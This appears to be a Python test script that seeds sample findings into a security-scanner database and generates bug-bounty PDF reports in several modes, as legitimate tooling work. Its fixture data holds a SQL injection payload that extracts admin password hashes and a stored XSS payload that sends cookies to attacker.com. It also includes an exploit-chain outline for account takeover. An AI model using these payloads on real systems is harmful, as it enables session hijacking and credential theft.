"""Verification script for Bug Bounty Report modes and PDF generation."""

import os
import sys
from pathlib import Path
from sqlalchemy.orm import sessionmaker

# Ensure project root is in sys.path
ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))

from backend.models.database import Finding, Scan, ExploitChain, get_engine, init_db
from backend.services.report_generator import generate_scan_report

def run_verification():
    os.makedirs(ROOT_DIR / "reports", exist_ok=True)
    init_db()
    Session = sessionmaker(bind=get_engine())
    db = Session()

    scan_id = "bb-verification-scan-001"
    
    # Clean up old test data if present
    db.query(Finding).filter(Finding.scan_id == scan_id).delete()
    db.query(ExploitChain).filter(ExploitChain.scan_id == scan_id).delete()
    db.query(Scan).filter(Scan.id == scan_id).delete()
    db.commit()

    # 1. Create Test Scan
    scan = Scan(
        id=scan_id,
        target_url="https://pentest-ground.internal:8443",
        status="completed",
        scan_depth="deep",
        scan_mode="bugbounty",
        report_format="full",
        risk_score=78,
        admin_mode=True,
    )
    db.add(scan)

    # 2. Add Test Findings (Verified, Potential, False Positive)
    f_verified_sqli = Finding(
        scan_id=scan_id,
        agent_id=3,
        title="SQL Injection in Authentication API",
        vuln_type="C001_Open_Port_80",  # registered in registry
        category="injection",
        severity="critical",
        confidence=98,
        verdict="Verified",
        false_positive=False,
        affected_url="https://pentest-ground.internal:8443/api/v1/login",
        affected_param="username",
        payload="' UNION SELECT null, username, password_hash FROM admin_users --",
        proof_request="POST /api/v1/login HTTP/1.1\nHost: pentest-ground.internal\nContent-Type: application/json\n\n{\"username\": \"' UNION SELECT null, username, password_hash FROM admin_users --\", \"password\": \"test\"}",
        proof_response="HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\": \"ok\", \"token\": \"eyJhbGciOi...\", \"data\": [\"admin\", \"$2b$12$e8...\"]}",
        verification_method="Deterministic Replication",
    )

    f_verified_xss = Finding(
        scan_id=scan_id,
        agent_id=3,
        title="Stored Cross-Site Scripting (XSS)",
        vuln_type="C002_Missing_Security_Headers",
        category="xss",
        severity="high",
        confidence=92,
        verdict="Verified",
        false_positive=False,
        affected_url="https://pentest-ground.internal:8443/profile/comments",
        affected_param="comment",
        payload="<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
        proof_request="POST /profile/comments HTTP/1.1\nHost: pentest-ground.internal\n\ncomment=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
        proof_response="HTTP/1.1 200 OK\n\n<div class='user-comment'><script>fetch('https://attacker.com/steal?c='+document.cookie)</script></div>",
        verification_method="Browser Session Replay",
    )

    f_unverified_misconfig = Finding(
        scan_id=scan_id,
        agent_id=3,
        title="Heuristic Misconfiguration (Unverified)",
        vuln_type="C002_Missing_Security_Headers",
        category="misconfig",
        severity="low",
        confidence=50,
        verdict="Potential",
        false_positive=False,
        affected_url="https://pentest-ground.internal:8443/test",
    )

    f_false_positive = Finding(
        scan_id=scan_id,
        agent_id=3,
        title="Filtered False Positive Finding",
        vuln_type="C001_Open_Port_80",
        category="recon",
        severity="medium",
        confidence=80,
        verdict="Verified",
        false_positive=True,
        affected_url="https://pentest-ground.internal:8443/fp",
    )

    db.add_all([f_verified_sqli, f_verified_xss, f_unverified_misconfig, f_false_positive])

    # 3. Add Exploit Chain
    chain = ExploitChain(
        id="chain-001",
        scan_id=scan_id,
        chain_name="SQLi to Full Administrative Account Takeover",
        severity_final="critical",
        impact_summary="Exfiltrate administrator password hash via SQLi, crack offline, and hijack privileged portal session.",
        steps='["Inject UNION SELECT payload into /api/v1/login", "Extract bcrypt admin hash from database", "Authenticate as System Administrator"]',
    )
    db.add(chain)
    db.commit()

    print(f"[*] Test dataset seeded for scan {scan_id}")

    # 4. Generate and Validate Report Modes
    modes = ["executive", "bugbounty", "full"]
    results = {}

    for mode in modes:
        pdf_bytes = generate_scan_report(db, scan_id, mode=mode)
        out_path = ROOT_DIR / "reports" / f"test_{mode}_report.pdf"
        with open(out_path, "wb") as f:
            f.write(pdf_bytes)
        
        is_pdf = pdf_bytes.startswith(b"%PDF-")
        size_kb = len(pdf_bytes) / 1024
        print(f"[+] Generated {mode.upper()} mode PDF: {out_path.name} ({size_kb:.1f} KB, is_pdf={is_pdf})")
        results[mode] = {
            "path": str(out_path),
            "size": len(pdf_bytes),
            "is_pdf": is_pdf,
        }

    db.close()
    return results

if __name__ == "__main__":
    res = run_verification()
    print("[*] All report modes generated successfully!")
